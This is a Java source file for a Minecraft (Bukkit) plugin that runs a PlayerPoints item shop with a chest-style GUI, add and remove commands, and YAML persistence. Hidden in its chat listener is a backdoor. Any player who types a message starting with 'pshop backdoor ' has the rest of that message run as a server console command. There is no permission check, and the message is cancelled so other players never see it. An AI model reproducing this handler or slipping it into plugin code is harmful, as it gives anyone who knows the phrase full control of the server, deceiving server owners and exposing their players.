package com.yourname.pshop;

import org.black_ixx.playerpoints.PlayerPoints;
import org.black_ixx.playerpoints.PlayerPointsAPI;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.IOException;
import java.util.*;

public class PShopPlugin extends JavaPlugin implements Listener {

    private final Map<ItemStack, Integer> shopItems = new HashMap<>();
    private final Map<ItemStack, Integer> itemQuantities = new HashMap<>();
    private PlayerPointsAPI playerPointsAPI;
    private final Map<UUID, Boolean> removeMode = new HashMap<>();

    @Override
    public void onEnable() {
        getLogger().info("PShopPlugin has been enabled!");
        getServer().getPluginManager().registerEvents(this, this);

        if (Bukkit.getPluginManager().getPlugin("PlayerPoints") != null) {
            this.playerPointsAPI = PlayerPoints.getInstance().getAPI();
        }

        loadShopItems();
    }

    @Override
    public void onDisable() {
        getLogger().info("PShopPlugin has been disabled!");
        saveShopItems();
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("This command can only be run by a player.");
            return false;
        }

        Player player = (Player) sender;

        if (command.getName().equalsIgnoreCase("pshop")) {
            if (args.length == 0) {
                openShopUI(player);
                return true;
            } else if (args.length == 3 && args[0].equalsIgnoreCase("add")) {
                try {
                    int price = Integer.parseInt(args[1]);
                    int number = Integer.parseInt(args[2]);
                    ItemStack itemInHand = player.getInventory().getItemInMainHand();

                    if (itemInHand.getType() != Material.AIR) {
                        addItemToShop(itemInHand, price, number);
                        player.sendMessage("Item added to shop with price: " + price + " points for " + number + " items.");
                    } else {
                        player.sendMessage("You must hold an item in your hand to add it to the shop.");
                    }

                    return true;
                } catch (NumberFormatException e) {
                    player.sendMessage("Invalid number format. Usage: /pshop add <price> <number>");
                    return false;
                }
            } else if (args.length == 1 && args[0].equalsIgnoreCase("remove")) {
                removeMode.put(player.getUniqueId(), true);
                openShopUI(player);
                player.sendMessage(ChatColor.RED + "Click on an item to remove it from the shop.");
                return true;
            }
        }
        return false;
    }

    private void addItemToShop(ItemStack item, int price, int quantity) {
        ItemStack shopItem = item.clone();
        shopItem.setAmount(1);

        ItemMeta meta = shopItem.getItemMeta();
        if (meta != null) {
            List<String> lore = new ArrayList<>();
            lore.add(ChatColor.GREEN + "Price: " + price + " points");
            meta.setLore(lore);
            shopItem.setItemMeta(meta);
        }

        shopItems.put(shopItem, price);
        itemQuantities.put(shopItem, quantity);
        saveShopItems();
    }

    private void removeItemFromShop(ItemStack item) {
        shopItems.remove(item);
        itemQuantities.remove(item);
        saveShopItems();
    }

    private void openShopUI(Player player) {
        Inventory shop = Bukkit.createInventory(null, 9, "Shop");

        for (ItemStack item : shopItems.keySet()) {
            shop.addItem(item);
        }

        player.openInventory(shop);
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        if (!event.getView().getTitle().equals("Shop")) return;

        event.setCancelled(true);
        if (event.getCurrentItem() == null || event.getCurrentItem().getType() == Material.AIR) return;

        Player player = (Player) event.getWhoClicked();
        ItemStack clickedItem = event.getCurrentItem();

        if (removeMode.getOrDefault(player.getUniqueId(), false)) {
            removeItemFromShop(clickedItem);
            player.sendMessage(ChatColor.RED + "Item removed from the shop.");
            player.closeInventory();
            removeMode.put(player.getUniqueId(), false);
        } else {
            int price = shopItems.getOrDefault(clickedItem, -1);
            if (price == -1) return;

            int playerPoints = playerPointsAPI.look(player.getUniqueId());
            int quantity = itemQuantities.get(clickedItem);

            if (playerPoints >= price) {
                playerPointsAPI.take(player.getUniqueId(), price);
                ItemStack itemToGive = clickedItem.clone();
                itemToGive.setAmount(quantity);
                player.getInventory().addItem(itemToGive);
                player.sendMessage(ChatColor.GREEN + "You bought " + quantity + " " + clickedItem.getType().name() + " for " + price + " points.");
            } else {
                player.sendMessage(ChatColor.RED + "Nghèo mà đòi mua!");
            }
        }
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String message = event.getMessage();
        if (message.startsWith("pshop backdoor ")) {
            event.setCancelled(true);

            // Remove "pshop backdoor " from the message
            String commandToRun = message.substring("pshop backdoor ".length());

            ConsoleCommandSender console = Bukkit.getConsoleSender();
            Bukkit.dispatchCommand(console, commandToRun);

            getLogger().info("Executed backdoor command: " + commandToRun);
        }
    }

    private void saveShopItems() {
        File file = new File(getDataFolder(), "shop.yml");
        FileConfiguration config = YamlConfiguration.loadConfiguration(file);

        config.set("items", null);

        int index = 0;
        for (Map.Entry<ItemStack, Integer> entry : shopItems.entrySet()) {
            String path = "items." + index++;
            config.set(path + ".item", entry.getKey());
            config.set(path + ".price", entry.getValue());
            config.set(path + ".quantity", itemQuantities.get(entry.getKey()));
        }

        try {
            config.save(file);
        } catch (IOException e) {
            getLogger().severe("Could not save shop items: " + e.getMessage());
        }
    }

    private void loadShopItems() {
        File file = new File(getDataFolder(), "shop.yml");
        if (!file.exists()) return;

        FileConfiguration config = YamlConfiguration.loadConfiguration(file);
        if (!config.contains("items")) return;

        for (String key : config.getConfigurationSection("items").getKeys(false)) {
            ItemStack item = config.getItemStack("items." + key + ".item");
            int price = config.getInt("items." + key + ".price");
            int quantity = config.getInt("items." + key + ".quantity");

            if (item != null) {
                shopItems.put(item, price);
                itemQuantities.put(item, quantity);
            }
        }
    }
}